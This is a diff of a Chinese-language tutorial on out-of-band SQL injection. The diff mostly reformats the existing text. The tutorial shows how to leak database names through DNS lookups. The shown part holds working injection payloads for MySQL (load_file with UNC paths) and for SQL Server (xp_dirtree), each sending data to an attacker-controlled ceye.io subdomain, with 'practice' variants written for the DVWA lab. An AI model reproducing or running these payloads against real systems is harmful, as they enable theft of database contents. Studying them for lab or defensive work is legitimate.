@@ -1,3 +1,4 @@
+
 <!-- TOC -->
 
 - [前言](#前言)
@@ -53,11 +54,14 @@
 * 支持load_file()函数（高版本默认不支持）
 * 开启allow_url_fopen（默认开启）
 
-主体语句：`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`
+核心语句：
+`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`
 
-dvwa实战语句1：`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
+dvwa实战语句1：
+`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
 
-dvwa实战语句2：`1' and if((select load_file(concat('\\\\',hex((select schema_name from information_schema.schemata limit 0,1)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
+dvwa实战语句2：
+`1' and if((select load_file(concat('\\\\',hex((select schema_name from information_schema.schemata limit 0,1)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
 
 
 **UNC路径**
@@ -72,9 +76,16 @@ dvwa实战语句2：`1' and if((select load_file(concat('\\\\',hex((select schem
 **因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据**
 
 #### SQL Server
-主体语句：`DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');`
 
-实战语句：`';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')--`
+核心语句：
+```sql
+DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');
+```
+
+实战语句：
+```sql
+';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')--
+```
 
 #### Oracle
 ```
